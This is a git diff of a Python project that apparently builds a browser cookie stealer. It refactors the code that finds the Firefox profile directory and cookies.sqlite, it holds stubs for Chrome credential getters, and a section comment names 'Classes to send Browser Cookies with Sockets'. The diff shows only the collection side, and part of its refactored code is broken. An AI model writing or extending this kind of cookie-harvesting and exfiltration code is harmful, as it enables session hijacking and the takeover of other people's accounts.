@@ -14,27 +14,51 @@ class OSDetector(OSInterface):
         return platform.system();
 
 
-# * Classes to search profile directories in different browsers
 
+# * Classes to search profile directories in different browsers
 class ProfileDirectoryFinder(ABC):
+
     @abstractmethod
-    def FindProfileDirectory(self):
+    def FindProfileDirectoryInLinux(self):
         pass
+
+    @abstractmethod 
+    def FindProfileDirectoryInWindows(self):
+        pass
+
 
 class FirefoxProfileFinder(ProfileDirectoryFinder):
 
-    def 
+    def FindProfileDirectoryInLinux(self):
+
+        homeDirectory = os.path.expanduser("~");
+        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")
+
+
+        if ".mozilla" not in os.listdir(homeDirectory):
+            print("firefox not installed")
+            return False;
+
+
+        for directory in os.listdir(browserDirectory):
+
+            if(directory.endswith(".default-esr")):
+                browserDirectory = os.path.join(browserDirectory, directory);
+                return browserDirectory
+
+            elif(directory.endswith(".default")):
+                browserDirectory = os.path.join(browserDirectory, directory); 
+                return browserDirectory
+            
+
+        print("Profile not found!")
+        return None;
+         
 
 
 
-
-
-
-
-
-
-
-
+    def FindProfileDirectoryInWindows(self):
+        pass
 
 
 
@@ -54,29 +78,22 @@ class BrowserCookiesGetter(ABC):
 
 class FirefoxCookiesGetter(BrowserCookiesGetter):
 
-    def __init__(self): 
-        pass
+    def __init__(self, profileFinder: ProfileDirectoryFinder): 
+        self.profileFinder = profileFinder;
 
 
     def GetCookiesInLinux(self):
 
-        homeDirectory = os.path.expanduser("~");
-        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")
+        browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();
 
-
-        if ".mozilla" not in os.listdir(homeDirectory):
-            print("firefox not installed")
+        if(not browserDirectory):
+            print("Error");
             return False;
 
-
-        for directory in os.listdir(browserDirectory):
-
-            if(directory.endswith(".default-esr")):
-                browserDirectory = os.path.join(browserDirectory, directory);
-                break;
-
-            elif(directory.endswith(".default")):
-                browserDirectory = os.path.join(browserDirectory, directory); 
+        cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite")
+        if not os.path.exists(cookiesDbPath):
+            print("Cookies database not found!")
+            return False
 
 
         try: 
@@ -152,15 +169,6 @@ class ChromeCookiesGetter(BrowserCredentialsGetter):
     def GetCookies(self):
         pass
 
-
-
-class EdgeCookiesGetter(BrowserCredentialsGetter):
-
-    def __init__(self): 
-        pass
-
-    def GetCookies(self):
-        pass
 
 
 # * Classes to send Browser Cookies with Sockets
